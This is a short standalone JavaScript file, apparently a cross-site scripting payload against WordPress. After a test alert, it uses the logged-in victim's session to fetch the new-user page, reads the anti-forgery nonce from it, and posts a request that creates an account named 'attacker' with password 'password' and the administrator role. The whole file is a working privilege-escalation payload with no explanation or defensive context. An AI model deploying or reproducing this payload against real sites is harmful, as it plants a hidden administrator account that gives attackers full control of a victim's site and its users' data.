alert("hello");
fetch("http://"+document.domain+"/wp-admin/user-new.php",{
    credentials: "include",
    method: "GET"
}).then(function(response) {
    return response.text();
}).then(function(data) {
    var parser = new DOMParser();
    var htmlDoc = parser.parseFromString(data, 'text/html');
    var wp_nonce = htmlDoc.getElementById('_wpnonce_create-user').value;
    console.log(wp_nonce);
    fetch("http://"+document.domain+"/wp-admin/user-new.php",{
        headers: new Headers({
            "Accept": "*\/*",
            "Accept-Language": "en-US,en;q=0.5",
            "Content-Type": "application\/x-www-form-urlencoded; charset=UTF-8"
        }),
        body: "action=createuser&_wpnonce_create-user="+wp_nonce+"&_wp_http_referer=%2Fwp-admin%2Fuser-new.php&user_login=attacker&email=attacker%40test.local&first_name=&last_name=&url=&pass1=password&pass1-text=password&pass2=password&pw_weak=on&role=administrator&createuser=Add+New+User",
        credentials: "include",
        method: "POST"
    })
})
